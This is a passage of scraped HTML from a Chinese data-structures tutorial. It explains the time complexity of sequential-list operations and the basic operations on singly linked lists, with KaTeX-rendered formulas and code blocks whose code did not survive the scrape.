style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li>
</ul>
<p>因此，顺序表删除算法的平均时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>可见，顺序表中插入和删除操作的时间主要耗费在移动元素上，而移动元素的个数取决于插入和删除元素的位置。</p>
</li>
<li>
<p><strong>按值查找（顺序查找）</strong></p>
<p>在顺序表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span> 中查找第一个元素值等于 <code>e</code> 的元素，并返回其位序。</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>最好情况</strong>：查找的元素就在表头，仅需比较一次，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span></li>
<li><strong>最坏情况</strong>：查找的元素在表尾（或不存在）时，需要比较 <code>n</code> 次，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></li>
<li><strong>平均情况</strong>：假设 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>p</mi><mi>i</mi></msub><mo stretchy="false">(</mo><msub><mi>p</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn><mi mathvariant="normal">/</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">p_{i} (p_{i} = 1/n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1/</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span> 是查找的元素在第 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi><mo stretchy="false">(</mo><mn>1</mn><mo>⩽</mo><mi>i</mi><mo>⩽</mo><mi>L</mi><mi mathvariant="normal">.</mi><mi>l</mi><mi>e</mi><mi>n</mi><mi>g</mi><mi>t</mi><mi>h</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">i (1 \leqslant i \leqslant L.length)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">i</span><span class="mopen">(</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7962em;vertical-align:-0.1367em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel amsrm">⩽</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">L</span><span class="mord">.</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">t</span><span class="mord mathnormal">h</span><span class="mclose">)</span></span></span></span> 个位置上的概率，则在长度为 <code>n</code> 的线性表中查找值为 <code>e</code> 的元素所需比较的平均次数为：<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><msub><mi>p</mi><mi>i</mi></msub><mo>×</mo><mi>i</mi><mo>=</mo><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>n</mi></munderover><mfrac><mn>1</mn><mi>n</mi></mfrac><mo>×</mo><mi>i</mi><mo>=</mo><mfrac><mn>1</mn><mi>n</mi></mfrac><mfrac><mrow><mi>n</mi><mo stretchy="false">(</mo><mi>n</mi><mo>+</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><mn>2</mn></mfrac><mo>=</mo><mfrac><mrow><mi>n</mi><mo>+</mo><mn>1</mn></mrow><mn>2</mn></mfrac></mstyle></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle\sum_{i=1}^{n} p_{i} \times i = \displaystyle\sum_{i=1}^{n} \dfrac{1}{n} \times i = \dfrac{1}{n} \dfrac{n(n + 1)}{2} = \dfrac{n + 1}{2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.9291em;vertical-align:-1.2777em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6514em;"><span style="top:-1.8723em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.05em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.3em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.2777em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.113em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:2.0074em;vertical-align:-0.686em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.3214em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">2</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.686em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></li>
</ul>
<p>因此，顺序表按值查找算法的平均时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></p>
</li>
</ol>
<h3> 线性表的链式表示</h3>
<p>顺序表的存储位置可以用一个简单直观的公式表示，它可以随机存取表中任意一个元素，但插入和删除操作需要移动大量元素。链式存储线性表时，不需要使用地址连续的存储单元，即不要求逻辑上相邻的元素在物理位置上也相邻，它通过 “链” 建立起元素之间的逻辑关系，因此插入和删除操作不需要移动元素，而只需修改指针，但也会失去顺序表可随机存取的优点。</p>
<h4> 单链表的定义</h4>
<p>线性表的链式存储又称单链表，它是指 <strong>通过一组任意的存储单元来存储线性表中的数据元素</strong>。为了建立数据元素之间的线性关系，对每个链表结点，除存放元素自身的信息外，还需要存放一个指向其后继的指针。单链表结点结构中 <code>data</code> 为数据域，存放数据元素；<code>next</code> 为指针域，存放其后继结点的地址。</p>
<p>单链表中结点类型的描述如下：</p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>利用单链表可以解决顺序表需要大量连续存储单元的缺点，但单链表附加指针域，也 <strong>存在浪费存储空间</strong> 的缺点。由于单链表的元素离散地分布在存储空间中，所以 <strong>单链表是非随机存取的存储结构</strong>，即不能直接找到表中某个特定的结点。查找某个特定的结点时，需要从表头开始遍历，依次查找。</p>
<p>通常用 <strong>头指针</strong> 来标识一个单链表，如：单链表 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi></mrow><annotation encoding="application/x-tex">L</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal">L</span></span></span></span>，头指针为 <code>NULL</code> 时表示个空表。此外，为了操作上的方便，在单链表第一个结点之前附加一个结点，称为 <strong>头结点</strong>。头结点的数据域可以不设任何信息，也可以记录表长等信息。头结点的指针域指向线性表的第一个元素结点，如下图所示。</p>
<figure><figcaption>带头结点的单链表</figcaption></figure>
<p><strong>头结点和头指针的区分</strong>：不管带不带头结点，头指针都始终指向链表的第一个结点，而头结点是带头结点的链表中的第一个结点，结点内通常不存储信息。</p>
<p><strong>引入头结点后，可以带来两个优点：</strong></p>
<ul>
<li>由于第一个数据结点的位置被存放在头结点的指针域中，因此在链表的第一个位置上的操作和在表的其他位置上的操作一致，无须进行特殊处理</li>
<li>无论链表是否为空，其头指针都是指向头结点的非空指针（空表中头结点的指针域为空），因此空表和非空表的处理也就得到了统一</li>
</ul>
<h4> 单链表上基本操作的实现</h4>
<ol>
<li>
<p><strong>采用头插法建立单链表</strong></p>
<p>该方法从一个空表开始，生成新结点，并将读取到的数据存放到新结点的数据域中，然后将新结点插入到当前链表的表头，即头结点之后，如下图所示。</p>
<figure><figcaption>头插法建立单链表</figcaption></figure>
<p><strong>头插法建立单链表的算法如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>采用头插法建立单链表时，读入数据的顺序与生成的链表中的元素的顺序是相反的。每个结点插入的时间为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，设单链表长为 <code>n</code>，则总时简复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
<p>若没有设立头结点，则上述代码需要在头部插入新结点的地方修改，因为每次插入新结点后，需要将它的地址赋值给头指针 L。</p>
</li>
<li>
<p><strong>采用尾插法建立单链表</strong></p>
<p>头插法建立单链表的算法虽然简单，但生成的链表中结点的次序和输入数据的顺序不一致。若希望两者次序一致，则可采用尾插法。该方法将新结点插入到当前链表的表尾，为此必须增加一个尾指针 <code>r</code>，使其始终指向当前链表的尾结点，如下图所示。</p>
<figure><figcaption>尾插法建立单链表</figcaption></figure>
<p><strong>尾插法建立单链表的算法如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>因为附设了一个指向表尾结点的指针，故时间复杂度和头插法的相同。</p>
</li>
<li>
<p><strong>按序号查找结点</strong></p>
<p>在单链表中从第一个结点出发，顺指针 <code>next</code> 域逐个往下搜索，直到找到第 <code>i</code> 个结点为止，否则返回最后一个结点指针域 <code>NULL</code>。</p>
<p><strong>按序号查找结点值的算法如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>按序号查找操作的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>按值查找表结点</strong></p>
<p>从单链表的第一个结点开始，由前往后依次比较表中各结点数据域的值，若某结点数据域的值等于给定值 <code>e</code>，则返回该结点的指针；若整个单链表中没有这样的结点，则返回 <code>NULL</code>。</p>
<p><strong>按值查找表结点的算法如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>按值查找操作的时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。</p>
</li>
<li>
<p><strong>插入结点操作</strong></p>
<p>插入结点操作将值为 <code>×</code> 的新结点插入到单链表的第 <code>i</code> 个位置上。先检查插入位置的合法性，然后找到待插入位置的前驱结点，即第 <code>i - 1</code> 个结点，再在其后插入新结点。</p>
<p>算法首先调用按序号查找算法 <code>GetElem(L, i - 1)</code>，查找第 <code>i - 1</code> 个结点。假设返回的第 <code>i - 1</code> 个结点为 <code>*P</code>，然后令新结点 <code>*s</code> 的指针域指向 <code>*p</code> 的后继结点，再令结点 <code>*P</code> 的指针域指向新插入的结点 <code>*s</code>。其操作过程如下图所示。</p>
<figure><figcaption>插入单链表</figcaption></figure>
<p><strong>实现插入结点的代码片段如下：</strong></p>
<div class="language-c line-numbers-mode" data-ext="c"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>算法中，语句 <code>2</code> 和 <code>3</code> 的顺序不能颠倒，否则，先执行 <code>p-&gt;next = s</code> 后，指向其原后继的指针就不存在，再执行 <code>s-&gt;next = p-&gt;next</code> 时，相当于执行了 <code>s-&gt;next = s</code>，显然是错误的。本算法主要的时间开销在于查找第 <code>i - 1</code> 个元素，时间复杂度为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>。若在给定的结点后面插入新结点，则时间复杂度仅为 <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo 